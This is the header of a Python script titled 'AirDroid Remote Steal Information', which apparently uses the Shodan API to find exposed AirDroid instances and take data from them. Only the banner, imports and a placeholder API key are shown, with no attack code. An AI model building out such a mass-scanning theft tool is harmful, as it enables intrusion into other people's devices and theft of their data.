#!/usr/bin/python

# coding: utf-8

# --------------------------------------------------
# \                                                 \
# \        AirDroid Remote Steal Information        \
# \     Hecho por: Marcelo Vázquez (aka s4vitar)    \
# \                                                 \
# --------------------------------------------------

import shodan, requests, time, os, sys, signal, urllib
from multiprocessing.dummy import Pool

# Usa tu API KEY de Shodan
SHODAN_API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
api = shodan.Shodan(SHODAN_API_KEY)
